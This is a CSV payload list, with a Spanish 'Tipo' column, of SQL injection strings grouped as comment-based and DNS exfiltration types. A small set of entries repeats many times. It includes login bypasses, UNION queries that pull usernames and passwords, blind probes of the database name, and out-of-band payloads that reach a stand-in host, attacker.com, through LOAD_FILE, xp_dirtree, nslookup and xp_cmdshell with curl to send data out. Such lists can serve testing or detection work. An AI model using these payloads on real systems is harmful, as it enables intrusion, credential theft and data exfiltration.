Payload,Tipo
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
' OR '1'='1' --,Comment_Based
' OR '1'='1' #,Comment_Based
' OR '1'='1' /*,Comment_Based
' AND '1'='1' --,Comment_Based
' AND '1'='1' #,Comment_Based
' AND '1'='1' /*,Comment_Based
' UNION SELECT NULL --,Comment_Based
' UNION SELECT NULL #,Comment_Based
' UNION SELECT NULL /*,Comment_Based
"' UNION SELECT username, password FROM users --",Comment_Based
"' UNION SELECT NULL, NULL FROM information_schema.tables #",Comment_Based
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",Comment_Based
"' AND IF(1=1, 'true', 'false') --",Comment_Based
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",Comment_Based
' AND LENGTH(DATABASE())>5 #,Comment_Based
' OR 1=1 --,Comment_Based
' OR 1=1 #,Comment_Based
' OR 1=1 /*,Comment_Based
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",Comment_Based
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",Comment_Based
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
'; exec master..xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; exec master..xp_fileexist '\\attacker.com\info'--,DNS_Exfiltration
'; exec master..xp_cmdshell 'ping attacker.com'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",DNS_Exfiltration
"' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",DNS_Exfiltration
'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,DNS_Exfiltration
"' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",DNS_Exfiltration
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",DNS_Exfiltration
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",DNS_Exfiltration
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",DNS_Exfiltration
'; EXEC xp_dirtree '\\attacker.com\data'--,DNS_Exfiltration
'; EXEC xp_fileexist '\\attacker.com\check'--,DNS_Exfiltration
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",DNS_Exfiltration
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,DNS_Exfiltration
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",DNS_Exfiltration
